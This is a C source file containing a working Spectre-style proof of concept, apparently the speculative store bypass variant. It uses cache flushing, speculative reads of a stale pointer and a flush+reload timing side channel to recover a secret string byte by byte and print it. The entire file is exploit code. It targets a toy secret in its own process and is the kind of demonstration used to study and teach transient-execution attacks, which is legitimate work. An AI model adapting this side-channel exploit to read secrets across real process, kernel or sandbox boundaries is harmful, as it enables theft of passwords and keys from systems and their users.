#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define LEN 16
#define MAX_TRIES 10000
#define CACHE_HIT_THRESHOLD 100


unsigned char** memory_slot_ptr[256];
unsigned char* memory_slot[256];

unsigned char secret_key[] = "PASSWORD_SPECTRE";
unsigned char public_key[] = "################";

uint8_t probe[256 * 4096];
volatile uint8_t tmp = 0;


void victim_function(size_t idx) {
	unsigned char **memory_slot_slow_ptr = *memory_slot_ptr;
	*memory_slot_slow_ptr = public_key;
	tmp = probe[(*memory_slot)[idx] * 4096];
}


void attacker_function() {
	char password[LEN + 1] = {'\0'};

	for (int idx = 0; idx < LEN; ++idx) {

		int results[256] = {0};
		unsigned int junk = 0;

		for (int tries = 0; tries < MAX_TRIES; tries++) {

			*memory_slot_ptr = memory_slot;
			*memory_slot = secret_key;

			_mm_clflush(memory_slot_ptr);
			for (int i = 0; i < 256; i++) {
				_mm_clflush(&probe[i * 4096]);
			}

			_mm_mfence();

			victim_function(idx);

			for (int i = 0; i < 256; i++) {
				volatile uint8_t* addr = &probe[i * 4096];
				uint64_t time1 = __rdtscp(&junk); // read timer
				junk = *addr; // memory access to time
				uint64_t time2 = __rdtscp(&junk) - time1; // read timer and compute elapsed time

				if (time2 <= CACHE_HIT_THRESHOLD && i != public_key[idx]) {
					results[i]++; // cache hit
				}
			}
		}
		tmp ^= junk; // use junk so code above won’t get optimized out

		int highest = -1;
		for (int i = 0; i < 256; i++) {
			if (highest < 0 || results[highest] < results[i]) {
				highest = i;
			}
		}
		printf("idx:%2d, highest:%c, hitrate:%f\n", idx, highest,
			(double)results[highest] * 100 / MAX_TRIES);
		password[idx] = highest;
	}
	printf("%s\n", password);
}


int main(void) {
	for (int i = 0; i < sizeof(probe); ++i) {
		probe[i] = 1; // write to array2 so in RAM not copy-on-write zero pages
	}
	attacker_function();
}
